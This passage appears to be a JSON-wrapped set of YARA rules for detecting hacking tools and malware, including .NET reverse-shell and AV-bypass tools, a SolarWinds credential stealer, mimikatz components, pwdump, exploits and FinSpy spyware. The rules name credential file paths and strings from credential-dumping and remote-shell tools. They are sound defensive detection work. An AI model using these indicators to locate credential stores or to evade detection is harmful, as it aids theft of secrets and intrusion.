uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_gray_hat_csharp_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/brandonprry/gray_hat_csharp_code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"gray_hat_csharp_code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_ReverseShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ReverseShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_DotNetAVBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mandreko/DotNetAVBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetAVBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_HexyRunner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/bao7uo/HexyRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HexyRunner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpOffensiveShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/darkr4y/SharpOffensiveShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpOffensiveShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_reconness {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/reconness/reconness\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"reconness\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_tvasion {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/loadenmb/tvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"tvasion\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ibombshell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Telefonica/ibombshell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ibombshell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RemoteProcessInjection {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/RemoteProcessInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RemoteProcessInjection\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_njRAT_0_7d_Stub_CSharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"njRAT-0.7d-Stub-CSharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_CACTUSTORCH {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/CACTUSTORCH\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"CACTUSTORCH\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_PandaSniper {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/QAX-A-Team/PandaSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"PandaSniper\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_xbapAppWhitelistBypassPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jpginc/xbapAppWhitelistBypassPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"xbapAppWhitelistBypassPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_StageStrike {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RedXRanger/StageStrike\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"StageStrike\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\nrule HKTL_Solarwinds_credential_stealer {\n    meta:\n        description = \"Detects solarwinds credential stealers like e.g. solarflare via the touched certificate, files and database columns\"\n        reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-20\"\n\t\thash = \"1b2e5186464ed0bdd38fcd9f4ab294a7ba28bd829bf296584cbc32e2889037e4\"\n\t\thash = \"4adb69d4222c80d97f8d64e4d48b574908a518f8d504f24ce93a18b90bd506dc\"\n    strings:\n        $certificate = \"CN=SolarWinds-Orion\" ascii nocase wide\n        $credfile1 = \"\\\\CredentialStorage\\\\SolarWindsDatabaseAccessCredential\" ascii nocase wide\n        $credfile2 = \"\\\\KeyStorage\\\\CryptoHelper\\\\default.dat\" ascii nocase wide\n        $credfile3 = \"\\\\Orion\\\\SWNetPerfMon.DB\" ascii nocase wide\n        $credfile4 = \"\\\\Orion\\\\RabbitMQ\\\\.erlang.cookie\" ascii nocase wide\n        $sql1 = \"encryptedkey\" ascii nocase wide fullword\n        $sql2 = \"protectiontype\" ascii nocase wide fullword\n        $sql3 = \"CredentialProperty\" ascii nocase wide fullword\n        $sql4 = \"passwordhash\" ascii nocase wide fullword\n        $sql5 = \"credentialtype\" ascii nocase wide fullword\n        $sql6 = \"passwordsalt\" ascii nocase wide fullword\n    condition:\n        uint16(0) == 0x5A4D and $certificate and ( 2 of ( $credfile* ) or 5 of ( $sql* ) )\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\n/*\n\n   THOR APT Scanner - Hack Tool Extract\n   This rulset is a subset of all hack tool rules included in our\n   APT Scanner THOR - the full featured APT scanner.\n\n   We will frequently update this file with new rules rated TLP:WHITE\n\n   Florian Roth\n   BSK Consulting GmbH\n   Web: bsk-consulting.de\n\n   revision: 20150510\n\n   License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)\n\tCopyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/\n\n*/\n\n/* WCE */\n\nrule WindowsCredentialEditor\n{\n    meta:\n    \tdescription = \"Windows Credential Editor\" threat_level = 10 score = 90\n    strings:\n\t\t$a = \"extract the TGT session key\"\n\t\t$b = \"Windows Credentials Editor\"\n    condition:\n    \t$a or $b\n}\n\nrule Amplia_Security_Tool\n{\n    meta:\n\t\tdescription = \"Amplia Security Tool\"\n\t\tscore = 60\n\t\tnodeepdive = 1\n    strings:\n\t\t$a = \"Amplia Security\"\n\t\t$b = \"Hernan Ochoa\"\n\t\t$c = \"getlsasrvaddr.exe\"\n\t\t$d = \"Cannot get PID of LSASS.EXE\"\n\t\t$e = \"extract the TGT session key\"\n\t\t$f = \"PPWDUMP_DATA\"\n    condition: 1 of them\n}\n\n/* pwdump/fgdump */\n\nrule PwDump\n{\n\tmeta:\n\t\tdescription = \"PwDump 6 variant\"\n\t\tauthor = \"Marc Stroebel\"\n\t\tdate = \"2014-04-24\"\n\t\tscore = 70\n\tstrings:\n\t\t$s5 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa\"\n\t\t$s6 = \"Unable to query service status. Something is wrong, please manually check the st\"\n\t\t$s7 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule PScan_Portscan_1 {\n\tmeta:\n\t\tdescription = \"PScan - Port Scanner\"\n\t\tauthor = \"F. Roth\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"00050;0F0M0X0a0v0}0\"\n\t\t$b = \"vwgvwgvP76\"\n\t\t$c = \"Pr0PhOFyP\"\n\tcondition:\n\t\tall of them\n}",
  "KiwiTaskmgr_2": "rule KiwiTaskmgr_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiTaskmgr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndTaskMgr\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "kappfree_2": "rule kappfree_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\tstrings:\n\t\t$s1 = \"kappfree.dll\" fullword ascii\n\t\t$s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\t\t$s3 = \"' introuvable !\" fullword wide\n\t\t$s4 = \"kiwi\\\\mimikatz\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}",
  "x_way2_5_sqlcmd": "rule x_way2_5_sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5152a57e3638418b0d97a42db1c0fc2f893a2794\"\n\tstrings:\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s4 = \"kernel32.dll\" fullword ascii\n\t\t$s5 = \"VirtualAlloc\" fullword ascii\n\t\t$s6 = \"VirtualFree\" fullword ascii\n\t\t$s7 = \"VirtualProtect\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\t\t$s9 = \"user32.dll\" fullword ascii\n\t\t$s16 = \"MessageBoxA\" fullword ascii\n\t\t$s10 = \"wsprintfA\" fullword ascii\n\t\t$s11 = \"kernel32.dll\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"GetModuleHandleA\" fullword ascii\n\t\t$s14 = \"LoadLibraryA\" fullword ascii\n\t\t$s15 = \"odbc32.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}",
  "Win32_klock": "rule Win32_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7addce4434670927c4efaa560524680ba2871d17\"\n\tstrings:\n\t\t$s1 = \"klock.dll\" fullword ascii\n\t\t$s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n\t\t$s3 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}",
  "ipsearcher": "rule ipsearcher {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ipsearcher.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e96e9c5c56fcbea94d26ce0b3f1548b224a4791\"\n\tstrings:\n\t\t$s0 = \"http://www.wzpg.com\" fullword ascii\n\t\t$s1 = \"ipsearcher\\\\ipsearcher\\\\Release\\\\ipsearcher.pdb\" fullword ascii\n\t\t$s3 = \"_GetAddress\" fullword ascii\n\t\t$s5 = \"ipsearcher.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}",
  "ms10048_x64": "rule ms10048_x64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"418bec3493c85e3490e400ecaff5a7760c17a0d0\"\n\tstrings:\n\t\t$s1 = \"The target is most likely patched.\" fullword ascii\n\t\t$s2 = \"Dojibiron by Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n\t\t$s3 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 1 of them\n}",
  "hscangui": "rule hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"http://www.cnhonker.com\" fullword ascii\n\t\t$s3 = \"%s@ftpscan#Cracked account:  %s/%s\" fullword ascii\n\t\t$s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}",
  "GoodToolset_ms11080": "rule GoodToolset_ms11080 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f0854c49eddf807f3a7381d3b20f9af4a3024e9f\"\n\tstrings:\n\t\t$s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s5 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s6 = \"[>] ms11-08 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}",
  "epathobj_exp64": "rule epathobj_exp64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"09195ba4e25ccce35c188657957c0f2c6a61d083\"\n\tstrings:\n\t\t$s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s2 = \"Exploit ok run command\" fullword ascii\n\t\t$s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\t\t$s6 = \"- inconsistent onexit begin-end variables\" fullword wide  /* Goodware String - occured 96 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}",
  "kelloworld_2": "rule kelloworld_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kelloworld.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\tstrings:\n\t\t$s1 = \"Hello World!\" fullword wide\n\t\t$s2 = \"kelloworld.dll\" fullword ascii\n\t\t$s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}",
  "HScan_v1_20_hscan": "rule HScan_v1_20_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n\t\t$s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}",
  "_Project1_Generate_rejoice": "rule _Project1_Generate_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\t\thash1 = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\t\thash2 = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"sfUserAppDataRoaming\" fullword ascii\n\t\t$s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n\t\t$s3 = \"delphi32.exe\" fullword ascii\n\t\t$s4 = \"hkeyCurrentUser\" fullword ascii\n\t\t$s5 = \"%s is not a valid IP address.\" fullword wide\n\t\t$s6 = \"Citadel hooking error\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}",
  "_hscan_hscan_hscangui": "rule _hscan_hscan_hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\t\thash1 = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\t\thash2 = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n\t\t$s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n\t\t$s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and all of them\n}",
  "kiwi_tools": "rule kiwi_tools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"b5c93489a1b62181594d0fb08cc510d947353bc8\"\n\t\thash8 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash9 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash10 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash11 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash12 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash13 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash14 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash15 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash16 = \"20facf1fa2d87cccf177403ca1a7852128a9a0ab\"\n\t\thash17 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n\t\t$s2 = \"Benjamin Delpy\" fullword ascii\n\t\t$s3 = \"GlobalSign\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "kiwi_tools_gentil_kiwi": "rule kiwi_tools_gentil_kiwi {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash8 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash9 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash10 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash11 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash12 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash13 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash14 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash15 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"mimikatz\" fullword wide\n\t\t$s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n\t\t$s3 = \"Gentil Kiwi\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}",
  "FinSpy_2": "rule FinSpy_2\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        $mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        $mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        $versions1 = /(f)inspyv2/ nocase\n        $versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx\n}",
